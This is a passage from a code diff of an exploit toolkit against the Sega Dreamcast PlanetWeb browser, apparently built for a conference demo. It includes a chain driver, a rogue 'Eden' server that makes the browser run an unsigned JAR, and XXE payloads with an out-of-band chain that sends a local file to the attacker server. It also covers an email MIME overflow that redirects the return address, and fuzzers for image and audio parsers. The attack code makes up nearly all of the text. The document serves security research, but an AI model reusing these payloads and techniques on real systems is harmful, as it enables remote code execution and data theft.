+          "-config","network:DNS="+ip,
+          DISC]
+    for att in range(1, FLYCAST_ATTEMPTS+1):
+        try: open(FCLOG,"w").close()
+        except Exception: pass
+        p=subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        ok=None
+        for _ in range(30):
+            time.sleep(1)
+            try: log=open(FCLOG,errors="ignore").read()
+            except Exception: log=""
+            if "Verify Failed" in log: ok=False; break      # vmem race -> relaunch
+            if "Game ID" in log:       ok=True;  break      # booting -> accept, DON'T probe it
+            if p.poll() is not None:   ok=False; break
+        if ok:
+            time.sleep(2)
+            if p.poll() is None:
+                fix_tty()   # sudo/Flycast left the TTY raw -- restore before we print anything else
+                if att>1: say("(booted on attempt %d)"%att)
+                return p
+        say("attempt %d: RAM-reservation race, relaunching"%att)
+        try: p.terminate()
+        except Exception: pass
+        subprocess.run(["pkill","-TERM","-x","Flycast"], stderr=subprocess.DEVNULL)
+        time.sleep(2)
+    warn("Flycast would not start in %d attempts (see %s)"%(FLYCAST_ATTEMPTS,FCLOG)); cleanup()
+
+# ---- watch the on-device chain arm, then tell the operator to fire ----
+armed_evt = threading.Event()
+
+def watch_chain():
+    """Tail the Eden log. The subscription chain [1]..[5] runs our JAR (StageDoom); StageDoom
+    then HTTP-streams the payload ([7] doom.bin) and plants the stub ([7b] stub.bin). Once the
+    stub is served the console is ARMED -- the blob is in the JVM heap and the loader stub sits
+    at 0x8C29ADE8, waiting for the email's saved-PR overwrite to return into it."""
+    # We can't see the console's RAM (no GDB) -- ARMED is INFERRED from StageDoom's own HTTP
+    # traffic to our Eden server, which happens in a fixed order:
+    #   [5] runs our JAR -> [7] fetch doom.bin/WAD -> POST /heap (blob staged, CONFIRMED) ->
+    #   [7b] fetch stub.bin -> setRawDeviceID plants it (NO callback -- invisible to us).
+    # The stub fetch is the last thing we see before the plant, so that's the ARMED trigger;
+    # the /heap POST first confirms the ~3.8MB blob actually finished staging in the heap.
+    steps = [("[1]",              "edenclient.conf — the console asks where to log in"),
+             ("[2]",              "POST /login    — we answer as Eden"),
+             ("[3]",              "POST /discovery — we offer a 'service'"),
+             ("[4]",              "POST /subscribe — we hand back a download URL"),
+             ("[5]",              "serving pwn_stagedoom.jar — *** CODE EXEC: the console runs our Java ***"),
+             ("serving doom.bin", "StageDoom is streaming doom.bin + WAD into a JVM-heap byte[] (magic DOOMSTG1)"),
+             ("staged doom=",     "blob CONFIRMED staged + pinned in the heap (StageDoom POSTed /heap back to us)"),
+             ("serving stub.bin", "StageDoom fetched the stub -> planting @0x8C29ADE8 via setRawDeviceID (cmd 100)")]
+    seen=set()
+    while True:
+        try: log=open(EDEN_LOG,errors="ignore").read()
+        except Exception: log=""
+        for tag,desc in steps:
+            if tag in log and tag not in seen:
+                seen.add(tag)
+                hot = tag in ("[5]","staged doom=","serving stub.bin")
+                say((Y+B if hot else "")+desc+X)
+        if "serving stub.bin" in log and not armed_evt.is_set():
+            armed_evt.set()
+            hdr(Y+B+"ARMED -- blob staged in RAM, stub planted @0x8C29ADE8. FIRE THE EMAIL."+X)
+            say(B+"Mail -> Check Mail, then OPEN the DOOM-STAGE message."+X)
+            say("opening it overflows the MIME name= field, overwrites the saved return address")
+            say("with 0x%08X, and returns into the stub -> it finds the heap blob, relocates the"%STUB_ADDR)
+            say("engine + WAD, and jumps into native SH-4 DOOM.")
+            say(R+"Do it promptly:"+X+" the ~3.8 MB blob lives in the JVM heap; browser activity can")
+            say("overwrite it. If DOOM doesn't come up, just re-open the message (or reconnect to")
+            say("re-run StageDoom), then open it again.")
+        time.sleep(1)
+
+CHUNK_BYTES = 262144   # must match StageDoom's CHUNK (256KB) for the /N estimate
+
+def watch_progress():
+    """Live download progress so you can SEE the stream advancing (not stalled). The Eden
+    server logs one '[CHUNK] start-end/total' line per range it serves; we tail + summarize.
+    StageDoom fetches doom.bin (~418KB) first, then the WAD (~3.4MB), in ~256KB chunks."""
+    last = ""
+    while not armed_evt.is_set():
+        try: log = open(EDEN_LOG, errors="ignore").read()
+        except Exception: log = ""
+        ch = re.findall(r"\[CHUNK\] (\d+)-(\d+)/(\d+)", log)
+        if ch:
+            end, tot = int(ch[-1][1]), int(ch[-1][2])
+            served = sum(1 for c in ch if int(c[2]) == tot)     # chunks served for the file in flight
+            of = max(1, -(-tot // CHUNK_BYTES))                  # ceil: expected chunks for this file
+            which = "engine" if tot < 1000000 else "WAD   "
+            rep = "%s  chunk %2d/%-2d   %5.2f/%.2f MB  (%3d%%)" % (
+                  which, served, of, end/1e6, tot/1e6, 100*end//tot)
+            if rep != last:
+                say(Y + "  ↓ " + rep + X)
+                last = rep
+        time.sleep(3)
+
+def watch_mail():
+    """Confirm the console actually fetched the DOOM-STAGE message (POP3 RETR/TOP)."""
+    told=False
+    while True:
+        try: log=open(MAIL_LOG,errors="ignore").read()
+        except Exception: log=""
+        if (("RETR" in log) or ("TOP" in log)) and not told:
+            told=True
+            say(G+"mail client fetched the DOOM-STAGE message -> overflow fires on open."+X)
+        time.sleep(1)
+
+def main():
+    if os.geteuid()!=0:
+        warn("needs root for :53/:80/:110 -- run:  sudo python3 dreamcast_doom_native.py"); sys.exit(1)
+    need = [FLYCAST, DISC, DNS_PY, EDEN_PY, MAIL_PY, STAGE_JAR, DOOM_BIN, STUB_BIN, WAD_FILE]
+    for f in need:
+        if not os.path.exists(f): warn("missing required file: %s"%f); sys.exit(1)
+
+    # mail_poc prefers a pre-built name_payload.hex over MAIL_PC; make sure that file (if it
+    # exists) actually points the email's saved-PR at our planted stub, or the jump misses.
+    npf = os.path.join(ROOT, "name_payload.hex")
+    if os.path.exists(npf):
+        try:
+            b = bytes.fromhex(open(npf).read().strip())
+            got = int.from_bytes(b[-4:], "little")
+            if got != STUB_ADDR:
+                warn("name_payload.hex targets 0x%08X, not the stub 0x%08X -- the email would miss."
+                     % (got, STUB_ADDR))
+                warn("fix name_payload.hex (or delete it so MAIL_PC=%s is used) before demoing." % MAIL_PC)
+                sys.exit(1)
+        except SystemExit: raise
+        except Exception as e:
+            warn("could not verify name_payload.hex (%s) -- check the email target by hand." % e)
+
+    signal.signal(signal.SIGINT, cleanup); signal.signal(signal.SIGTERM, cleanup)
+    ip=host_ip()
+
+    hdr("DEF CON -- PlanetWeb  ->  Eden RCE plants stub  ->  email overflow  ->  native DOOM  (NO GDB)")
+    say("host IP   %s   (guest DNS points here)"%ip)
+    say("disc      %s"%os.path.basename(DISC))
+    say("payload   pwn_stagedoom.jar -> doom.bin (%d B) + doom1_trim.wad (%d B)"
+        %(os.path.getsize(DOOM_BIN), os.path.getsize(WAD_FILE)))
+    say("stub      build/stub_native.bin (%d B) -> planted @0x%08X via setRawDeviceID"
+        %(os.path.getsize(STUB_BIN), STUB_ADDR))
+    say("email     MIME name= overflow: pad %s + saved-PR = 0x%08X"%(MAIL_PAD, STUB_ADDR))
+    if ip=="127.0.0.1":
+        warn("HOST_IP resolved to loopback -- the guest can't reach that. Set HOST_IP=<lan ip>.")
+
+    kill_stale()
+
+    # Keep the Mac FULLY awake for the whole demo. The staging download is a multi-minute,
+    # hands-off wait; if the host screensaves / display-sleeps / idle-sleeps, macOS throttles
+    # (App Nap) or suspends Flycast -> the emulated Java download stalls or its TCP drops. The
+    # -w <pid> makes caffeinate exit when we do.
+    try:
+        procs.append(("caffeinate", subprocess.Popen(
+            ["caffeinate","-dimsu","-w",str(os.getpid())],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)))
+        say("caffeinate: Mac kept awake (no sleep/screensaver) for the whole run")
+    except Exception:
+        warn("could not start caffeinate -- keep the Mac awake manually (move the mouse) during staging")
+
+    say("[1/4] DNS  : all names -> %s"%ip)
+    procs.append(("dns", subprocess.Popen(
+        [sys.executable,"-u",DNS_PY, ip, "--all", "--bind="+ip],
+        stdout=open(DNS_LOG,"w"), stderr=subprocess.STDOUT)))
+    time.sleep(1)
+
+    say("[2/4] Eden : rogue eden.planetweb.com on :%d   chain=stagedoom"%EDEN_PORT)
+    procs.append(("eden", subprocess.Popen(
+        [sys.executable,"-u",EDEN_PY, "--chain","stagedoom", "-p",str(EDEN_PORT)],
+        stdout=open(EDEN_LOG,"w"), stderr=subprocess.STDOUT)))
+    time.sleep(2)
+
+    say("[3/4] POP3 : DOOM-STAGE overflow mail on :%d   (saved-PR -> 0x%08X)"%(POP_PORT, STUB_ADDR))
+    procs.append(("mail", subprocess.Popen(
+        [sys.executable,"-u",MAIL_PY, "--pop", str(POP_PORT)],
+        stdout=open(MAIL_LOG,"w"), stderr=subprocess.STDOUT,
+        env=dict(os.environ, MAIL_PC=MAIL_PC, MAIL_PAD=MAIL_PAD))))
+    time.sleep(1)
+
+    say("[4/4] EMU  : launching the Dreamcast (GDB server OFF)")
+    launch_flycast(ip)
+    say("emulator up")
+
+    hdr("STEP 1 -- TAKE THE BROWSER ONLINE, THEN WAIT (do NOT open Mail yet)")
+    say(B+"A x3 -> Start -> web browser."+X+"  Let it connect, then leave it -- hands off.")
+    say("going online triggers Bug #1 on its own: the Eden client contacts us, we hand it our")
+    say("JAR, and it runs StageDoom -- which streams DOOM into the heap and plants the stub via")
+    say("Bug #3. This is automatic; you do NOT navigate anywhere. Open Mail ONLY when it says")
+    say(B+"ARMED"+X+" below -- opening the email before the stub is planted makes the jump miss.")
+    say("")
+
+    threading.Thread(target=watch_chain,    daemon=True).start()
+    threading.Thread(target=watch_progress, daemon=True).start()
+    threading.Thread(target=watch_mail,     daemon=True).start()
+
+    hdr(Y+B+"WATCHING THE CHAIN -- open the email when it says ARMED"+X)
+    say("no GDB, no staging over a debugger -- all three bugs run on the console. Ctrl-C stops everything.")
+    signal.pause()
+
+if __name__ == "__main__":
+    main()
+
+```
+
+`eden_mitm.py`:
+
+```py
+#!/usr/bin/env python3
+"""
+eden_mitm.py -- MITM / rogue-server exploit driver for the Sega Dreamcast
+PlanetWeb Internet Browser v3.0 (Eden client).
+
+It impersonates the dead Planetweb backend (eden.planetweb.com). The victim
+must resolve eden.planetweb.com -> this box (DNS/DHCP on real hardware via
+DreamPi, or /etc/hosts / emulator DNS redirect). The browser then walks itself
+into running our code:
+
+    GET  /edenclient.conf              -> tells the client where 'loginurl' is
+    POST /login                        -> login:response  (status 0) + discovery:url
+    POST /discovery                    -> discovery:response: one service + subscription-url
+    POST /subscribe                    -> subscription:response: service-download-url
+    GET  /pwn.jar                      -> the attacker service JAR (downloaded + executed)
+    GET  /junkyard.html, /junkyard.gif -> splash page the payload navigates to
+    GET  /doom.bin                     -> stage-2 payload slot (see README)
+
+All transport is plaintext HTTP and no JAR signature is verified, so simply
+answering for the host is enough -- no memory corruption required.
+
+Wire format reverse-engineered from the decompiled handlers:
+  * XML parser is namespace-AWARE but matches on the QUALIFIED name
+    (prefix:local), so prefixes (login:, device:, service: ...) are mandatory
+    and every prefix must be declared. <service> itself is matched UNPREFIXED.
+  * status values are prefixed ATTRIBUTES (login:status="0" etc.); 0 == success.
+  * element text is read via the first #text child, so keep leaves single-line.
+"""
+import argparse
+import re
+import sys
+import os
+import glob
+import struct
+import random
+import time
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent
+WWW = ROOT / "www"
+DOOM_JAR = ROOT / "build" / "doom.jar"
+# chain -> service jar served at /pwn.jar
+CHAIN_JARS = {
+    "splash": ROOT / "build" / "pwn_splash.jar",
+    "calc":   ROOT / "build" / "pwn_calc.jar",
+    "jdoom":  ROOT / "build" / "pwn_jdoom.jar",
+    "native": ROOT / "build" / "pwn_native.jar",
+    "overflow": ROOT / "build" / "pwn_overflow.jar",
+    "fuzz": ROOT / "build" / "pwn_fuzz.jar",
+    "takeover": ROOT / "build" / "pwn_takeover.jar",
+    "ridexploit": ROOT / "build" / "pwn_ridexploit.jar",
+    "nativedoom": ROOT / "build" / "pwn_nativedoom.jar",
+    "heapprobe": ROOT / "build" / "pwn_heapprobe.jar",
+    "armexploit": ROOT / "build" / "pwn_armexploit.jar",
+    "looparm": ROOT / "build" / "pwn_looparm.jar",
+    "stagedoom": ROOT / "build" / "pwn_stagedoom.jar",
+}
+CHAIN = "jdoom"   # overridden by --chain
+# prefer the tiny ~95KB single-room WAD (fits the browser's small applet heap),
+# then the trimmed E1M1, then full Freedoom.
+_mini = ROOT / "wad" / "doom_mini.wad"
+_trim = ROOT / "wad" / "doom_e1m1.wad"
+DOOM_WAD = _mini if _mini.exists() else (_trim if _trim.exists() else (ROOT / "wad" / "freedoom1.wad"))
+
+# The host the client believes it is talking to. Keep as the real Planetweb host
+# so the hardcoded URLs in our XML match what the device resolves to us.
+EDEN_HOST = "eden.planetweb.com"
+
+
+def base_url():
+    return "http://" + EDEN_HOST
+
+# ---- XXE weaponization (com.planetweb.xml.XMLParser is unhardened; parses every
+# Eden login/discovery/subscribe response) -- toggle with EDEN_XXE=1 ----
+XXE = os.environ.get("EDEN_XXE")
+XXE_FILE = os.environ.get("EDEN_XXE_FILE", "file:///flashrom")   # OOB exfil target (tunable)
+COOKIE_N = int(os.environ.get("EDEN_COOKIE", "0"))   # PATH A: Set-Cookie value length (overflow the request builder's "Cookie: %s")
+
+def xxe_block(root):
+    """DOCTYPE injected before a response root. Contains:
+      - general entity &ssrf;  -> fetched from our server when referenced in body
+        (reliable confirmation that external entities resolve = XXE).
+      - parameter-entity OOB chain (%file -> %dtd -> %send) -> reads XXE_FILE and
+        exfils its content to /xxe-leak via an external DTD we serve."""
+    b = base_url()
+    if XXE == "internal":      # diagnostic: internal entity (no network) -> tells us if
+        # DTD/entity processing works at all (vs external resolution being disabled)
+        return "<!DOCTYPE " + root + ' [<!ENTITY ssrf "INTXXEOK">]>'
+    dt = "<!DOCTYPE " + root + " [" + '<!ENTITY ssrf SYSTEM "' + b + '/xxe-probe">'
+    if XXE == "full":          # add OOB file-exfil chain (risks parse-fail if file absent)
+        dt += ('<!ENTITY % file SYSTEM "' + XXE_FILE + '">'
+               + '<!ENTITY % dtd SYSTEM "' + b + '/xxe.dtd">'
+               + "%dtd;%send;")
+    return dt + "]>"
+
+def xxe_dtd():
+    """OOB exfil DTD: build a 'send' parameter entity whose SYSTEM URL embeds the
+    target file's content, then trigger it."""
+    b = base_url()
+    return ('<!ENTITY % all "<!ENTITY &#37; send SYSTEM \'' + b
+            + '/xxe-leak?f=%file;\'>">' + "%all;")
+
+
+# --- the config file that bootstraps the login URL ------------------------- #
+def pwned_page(devid, os_str):
+    # Full-screen RCE-takeover page (the live-demo opener). Old-HTML-safe:
+    # bgcolor/text/font size+color + an animated GIF banner + leaked device id.
+    if not devid: devid = "(locked)"
+    return (
+      '<html><head><title>OWNED</title></head>'
+      '<body bgcolor="#000000" text="#ff2020" link="#ff8800">'
+      '<center>'
+      '<br><img src="/pwned.gif" width="512" height="128">'
+      '<br><br><font size="7" color="#ff2020"><b>*** YOUR DREAMCAST IS OWNED ***</b></font>'
+      '<br><font size="5" color="#ffaa00"><b>DistrictCon Junkyard</b></font>'
+      '<br><br><font size="4" color="#ffffff">Unauthenticated Remote Code Execution</font>'
+      '<br><font size="3" color="#bbbbbb">via PlanetWeb "Eden" v3.0  --  over a spoofed, expired eden.planetweb.com</font>'
+      '<br><br><font size="4" color="#00ff66">RAW DEVICE ID:&nbsp; <b>' + devid + '</b></font>'
+      '<br><font size="3" color="#88ff88">RUNNING ON:&nbsp; ' + (os_str or "Sega Dreamcast / SH-4") + '</font>'
+      '<br><br><font size="2" color="#ff8888">no memory corruption needed: the browser trusts a dead domain '
+      'and runs our unsigned code  --  fully privileged (no SecurityManager)</font>'
+      '<br><br><img src="/e1m1_doom.png" width="360">'
+      '</center></body></html>')
+
+def edenclient_conf():
+    # java.util.Properties format. Point loginurl back at us.
+    return "loginurl=" + base_url() + "/login\n"
+
+
+# --- XML responses --------------------------------------------------------- #
+def login_response(device_id):
+    dt = xxe_block("login:response") if XXE else ""
+    ref = "&ssrf;" if XXE else ""        # general-entity ref in body -> SSRF confirm
+    return (
+        '<?xml version="1.0"?>' + dt +
+        '<login:response'
+        ' xmlns:login="http://www.planetweb.com/login"'
+        ' xmlns:device="http://www.planetweb.com/device"'
+        ' xmlns:token="http://www.planetweb.com/token"'
+        ' xmlns:session="http://www.planetweb.com/session"'
+        ' xmlns:discovery="http://www.planetweb.com/discovery"'
+        ' login:status="0">'
+        '<device:id>' + device_id + ref + '</device:id>'
+        '<token:data>junkyardtoken</token:data>'
+        '<session:id>junkyardsession</session:id>'
+        '<discovery:url>' + base_url() + '/discovery</discovery:url>'
+        '</login:response>'
+    )
+
+
+def discovery_response():
+    return (
+        '<?xml version="1.0"?>'
+        '<discovery:response'
+        ' xmlns:discovery="http://www.planetweb.com/discovery"'
+        ' xmlns:service="http://www.planetweb.com/service"'
+        ' discovery:status="0">'
+        '<service>'
+        '<service:name>JunkyardService</service:name>'
+        '<service:subscription-url>' + base_url() + '/subscribe</service:subscription-url>'
+        '</service>'
+        '</discovery:response>'
+    )
+
+
+def subscription_response():
+    return (
+        '<?xml version="1.0"?>'
+        '<subscription:response'
+        ' xmlns:subscription="http://www.planetweb.com/subscription"'
+        ' subscription:status="0">'
+        '<subscription:service-download-url>' + base_url() + '/pwn.jar'
+        '</subscription:service-download-url>'
+        '</subscription:response>'
+    )
+
+
+DEVID_RE = re.compile(rb"<device:id>(.*?)</device:id>", re.S)
+
+# ------------------------- dynamic browser-parser fuzzing -------------------------
+# Each /fz/ request mutates a FRESH batch of images and returns a page that
+# auto-refreshes (meta + JS) to a NEW unique /fz/ URL -> the browser loops,
+# decoding new fuzzed GIF/JPEGs continuously until a decoder crashes. No reboots.
+FUZZ_SEEDS = ROOT / "fuzz_seeds"
+FZ_DIR     = WWW / "fuzz"
+FUZZ_BATCH = 8            # mutated images per page
+FUZZ_REFRESH = 3          # seconds between page refreshes
+_fuzz_ctr = [0]
+
+# NEW fuzzer: fault-weighted, structure-preserving mutations. Aim for OOB WRITES
+# (memory corruption -> SH4 fault) rather than infinite loops. Known DoS-hang
+# mutations (GIF LZW code size >8, GIF dims >4096) are DOWN-WEIGHTED so the loop
+# keeps hunting faults instead of freezing.
+def _gif_mut(b):
+    b = bytearray(b)
+    s = random.choice(["ct","subblk","lzwdata","imgpos","rand","rand","rand"])  # hang class dropped
+    if s == "ct" and len(b) >= 11:                     # claim large color table, little data -> over-read/write
+        b[10] = 0xF0 | random.randint(0,7)
+    elif s == "subblk":                                # corrupt a data sub-block length (claim more than present)
+        i = b.find(b"\x2c")
+        if i >= 0 and i+11 < len(b): b[i+11] = 0xFF
+    elif s == "lzwdata":                               # valid code size, garbage codes -> dictionary growth past bound
+        i = b.find(b"\x2c")
+        if i >= 0 and i+11 < len(b):
+            b[i+10] = random.randint(2,8)              # KEEP code size legal (avoid hang)
+            for k in range(i+12, min(i+12+random.randint(20,120), len(b))): b[k] = random.randrange(256)
+    elif s == "imgpos":                                # image extends past canvas (moderate, not huge)
+        i = b.find(b"\x2c")
+        if i >= 0 and i+9 < len(b):
+            b[i+5:i+7] = struct.pack("<H", random.choice([256,512,1024,2048]))
+            b[i+7:i+9] = struct.pack("<H", random.choice([256,512,1024,2048]))
+    elif s == "hang":                                  # rare: known DoS classes (kept for coverage)
+        i = b.find(b"\x2c")
+        if i >= 0 and i+10 < len(b): b[i+10] = random.choice([12,0]);
+    else:
+        for _ in range(random.randint(2,14)): b[random.randrange(len(b))] = random.randrange(256)
+    return bytes(b)
+
+def _jpg_mut(b):
+    # JPEG decoder = richer write surface (Huffman/quant/component tables) -> fault-prone
+    b = bytearray(b)
+    # diversified set: DHT down-weighted (it saturates / is already confirmed);
+    # emphasize less-explored markers to hunt NEW classes.
+    s = random.choice(["dht","sof","dqt","dqt","sos","dri",
+                       "progparam","seglen","markerinj","app","sofprec","rand","rand"])
+    if s == "dht":                                     # Huffman counts summing >256 -> classic code-array overflow
+        i = b.find(b"\xff\xc4")
+        if i >= 0 and i+21 < len(b):
+            for k in range(i+5, i+21): b[k] = random.choice([0xff,0x80,0x40])
+    elif s == "progparam":                             # progressive scan params Ss/Se/Ah/Al (SOS tail)
+        i = b.find(b"\xff\xda")
+        if i >= 0:
+            ln = (b[i+2]<<8)|b[i+3]; end = i+2+ln
+            if end <= len(b) and end-3 >= 0:
+                for k in range(end-3, end): b[k] = random.choice([0,63,64,0xff,random.randrange(256)])
+    elif s == "seglen":                                # corrupt a marker's length -> over-read past segment
+        for m in (b"\xff\xc4", b"\xff\xdb", b"\xff\xc0", b"\xff\xc2", b"\xff\xda"):
+            i = b.find(m)
+            if i >= 0 and i+4 < len(b):
+                b[i+2:i+4] = struct.pack(">H", random.choice([0xffff,0xff00,0x0001,0x0003,2048])); break
+    elif s == "markerinj":                             # inject a spurious/duplicate marker before SOS
+        i = b.find(b"\xff\xda")
+        if i >= 0:
+            inj = random.choice([b"\xff\xc4\x00\x05\x00\x01\x00",   # tiny DHT
+                                 b"\xff\xdb\x00\x03\x00",            # truncated DQT
+                                 b"\xff\xdd\x00\x04\xff\xff",        # DRI huge
+                                 b"\xff\xc0\x00\x05\x08\x00"])       # truncated SOF
+            b[i:i] = inj
+    elif s == "app":                                   # APP0/APPn length + payload
+        i = b.find(b"\xff\xe0")
+        if i >= 0 and i+4 < len(b):
+            b[i+2:i+4] = struct.pack(">H", random.choice([0xffff,0x0002,0xff00]))
+    elif s == "sofprec":                               # sample precision byte (legal 8/12) -> bad bit depth
+        for m in (b"\xff\xc0", b"\xff\xc2"):
+            i = b.find(m)
+            if i >= 0 and i+4 < len(b): b[i+4] = random.choice([0,1,16,0x20,0xff]); break
+    elif s == "components":                            # component count / ids / sampling mismatch
+        for m in (b"\xff\xc0", b"\xff\xc2"):
+            i = b.find(m)
+            if i >= 0 and i+9 < len(b):
+                b[i+9] = random.choice([0,4,5,0x10,0xff])               # Nf components
+                if i+12 < len(b): b[i+11] = random.choice([0x11,0x22,0xff])  # sampling factors
+                break
+    elif s == "sof":                                   # moderate-large dims (allocate+write, avoid 65535 hang)
+        for m in (b"\xff\xc0", b"\xff\xc2"):
+            i = b.find(m)
+            if i >= 0 and i+9 < len(b):
+                b[i+5:i+7] = struct.pack(">H", random.choice([1024,2048,4096,8192]))
+                b[i+7:i+9] = struct.pack(">H", random.choice([1024,2048,4096,8192])); break
+    elif s == "dqt":
+        i = b.find(b"\xff\xdb")
+        if i >= 0 and i+4 < len(b): b[i+4] = random.choice([0x10,0xff,0x05])  # bad precision/table id
+    elif s == "sos":                                   # scan component selector / count mismatch
+        i = b.find(b"\xff\xda")
+        if i >= 0 and i+5 < len(b): b[i+4] = random.choice([0,4,5,0xff])
+    elif s == "dri":                                   # restart interval
+        b[2:2] = b"\xff\xdd\x00\x04" + struct.pack(">H", random.choice([1,0xffff]))
+    else:
+        for _ in range(random.randint(2,16)): b[random.randrange(len(b))] = random.randrange(256)
+    return bytes(b)
+
+def _png_mut(b):
+    # PNG decoder (libpng-derived, confirmed in ROM: IHDR validation strings +
+    # zlib 1.1.3). Mutate IHDR fields / chunk lengths / IDAT zlib stream; recompute
+    # the chunk CRC for field mutations so the malformed value reaches the decoder
+    # logic (not just the CRC check).
+    import zlib
+    b = bytearray(b)
+    chunks = []; i = 8
+    while i + 12 <= len(b):
+        ln = int.from_bytes(b[i:i+4], "big"); typ = bytes(b[i+4:i+8])
+        chunks.append((i, ln, typ)); i += 12 + ln
+        if ln > len(b): break
+    def fixcrc(off, ln):
+        crc = zlib.crc32(bytes(b[off+4:off+8+ln])) & 0xffffffff
+        b[off+8+ln:off+12+ln] = struct.pack(">I", crc)
+    s = random.choice(["dims","depth","color","interlace","chunklen","idat","plte","rand","rand"])
+    ihdr = next((c for c in chunks if c[2] == b"IHDR"), None)
+    if s in ("dims","depth","color","interlace") and ihdr:
+        off, ln, _ = ihdr; d = off + 8                 # IHDR: W(4)H(4)depth(1)color(1)comp(1)filt(1)interlace(1)
+        if s == "dims":                                # huge dims -> W*H*channels buffer-size overflow
+            b[d:d+4]   = struct.pack(">I", random.choice([0xFFFFFFFF,0x7FFFFFFF,0x10000,0xFFFF,0]))
+            b[d+4:d+8] = struct.pack(">I", random.choice([0xFFFFFFFF,0x10000,0xFFFF,1]))
+        elif s == "depth":  b[d+8]  = random.choice([0,3,7,16,32,255])   # legal 1,2,4,8,16
+        elif s == "color":  b[d+9]  = random.choice([1,5,7,8,255])       # legal 0,2,3,4,6
+        elif s == "interlace": b[d+12] = random.choice([2,3,255])        # legal 0,1 (Adam7 path)
+        if d+12 < len(b): fixcrc(off, ln)
+    elif s == "chunklen" and chunks:                   # over-long chunk length -> over-read
+        off = random.choice(chunks)[0]
+        b[off:off+4] = struct.pack(">I", random.choice([0xFFFFFFFF,0x10000,0xFFFF]))
+    elif s == "idat":                                  # corrupt zlib stream -> inflate OOB / bomb
+        idat = next((c for c in chunks if c[2] == b"IDAT"), None)
+        if idat:
+            off, ln, _ = idat
+            for _ in range(random.randint(2,12)):
+                if ln > 0: b[off+8+random.randrange(ln)] = random.randrange(256)
+            fixcrc(off, ln)
+    elif s == "plte":                                  # palette size mismatch -> index OOB
+        plte = next((c for c in chunks if c[2] == b"PLTE"), None)
+        if plte:
+            off = plte[0]; b[off:off+4] = struct.pack(">I", random.choice([0xFFFF,3,768,0]))
+    else:
+        for _ in range(random.randint(2,16)): b[random.randrange(len(b))] = random.randrange(256)
+    return bytes(b)
+
+def _wav_mut(b):                                       # RIFF/WAVE audio parser (chunk-size overruns)
+    b = bytearray(b)
+    s = random.choice(["riffsize","datasize","fmtsize","chans","bits","rate","rand"])
+    if s == "riffsize" and len(b) >= 8:
+        b[4:8] = struct.pack("<I", random.choice([0xFFFFFFFF,0x10000,2]))
+    elif s == "datasize":
+        i = b.find(b"data");  i>=0 and i+8<=len(b) and b.__setitem__(slice(i+4,i+8), struct.pack("<I", random.choice([0xFFFFFFFF,0x10000,0])))
+    elif s == "fmtsize":
+        i = b.find(b"fmt ");  i>=0 and i+8<=len(b) and b.__setitem__(slice(i+4,i+8), struct.pack("<I", random.choice([0xFFFF,0,1,0x10000])))
+    elif s == "chans":
+        i = b.find(b"fmt ");  i>=0 and i+12<=len(b) and b.__setitem__(slice(i+10,i+12), struct.pack("<H", random.choice([0,0xFFFF,256])))
+    elif s == "bits":
+        i = b.find(b"fmt ");  i>=0 and i+24<=len(b) and b.__setitem__(slice(i+22,i+24), struct.pack("<H", random.choice([0,1,7,255,0xFFFF])))
+    elif s == "rate":
+        i = b.find(b"fmt ");  i>=0 and i+16<=len(b) and b.__setitem__(slice(i+12,i+16), struct.pack("<I", random.choice([0,0xFFFFFFFF])))
+    else:
+        for _ in range(random.randint(2,12)): b[random.randrange(len(b))] = random.randrange(256)
+    return bytes(b)
+
+def _swf_mut(b):                                       # SWF/Flash (header + tag-length parsing)
+    b = bytearray(b)
+    s = random.choice(["filelen","ver","rect","tag","rand"])
+    if s == "filelen" and len(b) >= 8:
+        b[4:8] = struct.pack("<I", random.choice([0xFFFFFFFF,0x10000,2]))
+    elif s == "ver" and len(b) >= 4: b[3] = random.choice([0,99,255])
+    elif s == "rect" and len(b) > 8: b[8] = random.choice([0xF8,0xFF,0x00])  # rect nbits
+    elif s == "tag" and len(b) > 10:
+        p = random.randrange(8, len(b)-1); b[p:p+2] = struct.pack("<H", random.choice([0xFFFF,0xFFC0,0]))
+    else:
+        for _ in range(random.randint(2,12)): b[random.randrange(len(b))] = random.randrange(256)
+    return bytes(b)
+
+# ---- AFL-style mutation layer (strategies from github.com/google/AFL) ----
+# We can't run AFL's coverage-guided fork-server (target = SH4 guest in Flycast),
+# but its mutation engine + corpus/splice port directly. "interesting" values are
+# AFL's INTERESTING_8/16/32 boundary tables (config.h).
+AFL_I8  = [0x80,0xff,0x00,0x01,0x10,0x20,0x40,0x64,0x7f]
+AFL_I16 = AFL_I8 + [0x8000,0xff7f,0x0080,0x00ff,0x0100,0x0200,0x03e8,0x0400,0x1000,0x7fff]
+AFL_I32 = AFL_I16 + [0x80000000,0xfa0000fa,0xffff7fff,0x00008000,0x0000ffff,0x00010000,0x05ffff05,0x7fffffff]
+_HDR = {"jpg":2,"jpeg":2,"gif":6,"png":8,"swf":3,"wav":4}   # bytes to preserve (magic) so decoder still engages
+
+def _afl_havoc(b, hdr=8):
+    """AFL havoc: a stacked sequence of random mutations. Destructive ops are kept
+    past the magic (hdr) so the browser still routes to the decoder."""
+    b = bytearray(b)
+    if len(b) <= hdr + 1: return bytes(b)
+    for _ in range(1 << random.randint(1,6)):
+        L = len(b)
+        if L <= hdr + 1: break
+        p = random.randint(hdr, L-1); op = random.randint(0,10)
+        if   op == 0: b[p] ^= 1 << random.randint(0,7)                 # flip a bit
+        elif op == 1: b[p] = random.choice(AFL_I8)                     # interesting u8
+        elif op == 2: b[p] = (b[p] + random.randint(-35,35)) & 0xff    # byte arith
+        elif op == 3 and p+2 <= L:                                     # interesting u16
+            f = "<H" if random.random()<.5 else ">H"; b[p:p+2] = struct.pack(f, random.choice(AFL_I16)&0xffff)
+        elif op == 4 and p+2 <= L:                                     # u16 arith
+            f = "<H" if random.random()<.5 else ">H"
+            b[p:p+2] = struct.pack(f, (struct.unpack(f,bytes(b[p:p+2]))[0]+random.randint(-255,255))&0xffff)
+        elif op == 5 and p+4 <= L:                                     # interesting u32 (len/dim fields)
+            f = "<I" if random.random()<.5 else ">I"; b[p:p+4] = struct.pack(f, random.choice(AFL_I32)&0xffffffff)
+        elif op == 6 and p+4 <= L:                                     # u32 arith
+            f = "<I" if random.random()<.5 else ">I"
+            b[p:p+4] = struct.pack(f, (struct.unpack(f,bytes(b[p:p+4]))[0]+random.randint(-4096,4096))&0xffffffff)
+        elif op == 7: b[p] = random.randrange(256)                     # random byte
